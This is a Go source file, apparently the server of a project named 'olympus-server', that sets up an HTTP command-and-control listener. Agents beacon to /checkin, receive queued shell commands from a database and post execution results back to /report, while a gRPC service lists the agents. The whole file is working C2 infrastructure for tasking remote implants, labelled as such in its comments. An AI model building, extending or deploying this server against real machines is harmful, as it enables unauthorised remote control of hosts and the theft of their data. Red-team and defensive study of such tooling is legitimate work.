package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/NotKidding/olympus-server/internal/db"
	"github.com/NotKidding/olympus-server/internal/models"
	pb "github.com/NotKidding/olympus-server/pkg/api/proto/olympus/v1"
	"google.golang.org/grpc"
)

// OlympusServer implements the generated gRPC OlympusServiceServer interface
type OlympusServer struct {
	pb.UnimplementedOlympusServiceServer
	mu     sync.Mutex
	agents []*pb.Agent
}

// GetAgents is the gRPC method called by the UI (Role C)
func (s *OlympusServer) GetAgents(ctx context.Context, in *pb.GetAgentsRequest) (*pb.GetAgentsResponse, error) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return &pb.GetAgentsResponse{Agents: s.agents}, nil
}

func main() {
	// 1. Initialize the Secure Persistence Bridge (Agents & Tasks)
	db.InitDB()

	server := &OlympusServer{}

	// 2. Start gRPC Management Server
	go func() {
		lis, err := net.Listen("tcp", "0.0.0.0:9090")
		if err != nil {
			log.Fatalf("failed to listen: %v", err)
		}
		s := grpc.NewServer()
		pb.RegisterOlympusServiceServer(s, server)
		fmt.Println("[*] gRPC Management Server listening on :9090")
		s.Serve(lis)
	}()

	// 3. HTTP C2 Listener (Beaconing & Tasking)
	http.HandleFunc("/checkin", func(w http.ResponseWriter, r *http.Request) {
		agentID := r.Header.Get("X-Agent-ID")
		if agentID == "" {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		osVer := r.Header.Get("X-OS-Version")
		arch := r.Header.Get("X-Arch")

		agent := models.Agent{
			ID:        agentID,
			Hostname:  r.RemoteAddr,
			OSVersion: osVer,
			Arch:      arch,
			LastSeen:  time.Now(),
		}
		db.DB.Save(&agent)

		var task models.Task
		err := db.DB.Where("agent_id = ? AND status = ?", agentID, "pending").Order("created_at asc").First(&task).Error

		if err == nil {
			fmt.Fprintf(w, "%s", task.Command)
			db.DB.Model(&task).Update("status", "sent")
			log.Printf("[+] Task dispatched to %s: %s", agentID, task.Command)
		} else {
			w.Write([]byte("OLYMPUS_ACK"))
		}
	})

	// This receives the output of the command from Hermes
	http.HandleFunc("/report", func(w http.ResponseWriter, r *http.Request) {
		agentID := r.Header.Get("X-Agent-ID")
		if agentID == "" {
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		// Read the execution result from the request body
		body, err := io.ReadAll(r.Body)
		if err != nil {
			log.Printf("[-] Error reading report body: %v", err)
			return
		}

		// Find the most recent task that was 'sent' to this agent
		var task models.Task
		err = db.DB.Where("agent_id = ? AND status = ?", agentID, "sent").Order("updated_at desc").First(&task).Error

		if err == nil {
			// Update the task with the result and mark as completed
			db.DB.Model(&task).Updates(map[string]interface{}{
				"status": "completed",
				"result": string(body),
			})
			log.Printf("[+] Mission Accomplished by %s: Result stored in DB.", agentID)
			w.Write([]byte("REPORT_ACK"))
		} else {
			log.Printf("[-] No 'sent' task found for %s to report against.", agentID)
		}
	})

	fmt.Println("[*] HTTP C2 Server listening on :8080")
	log.Fatal(http.ListenAndServe("0.0.0.0:8080", nil))
}
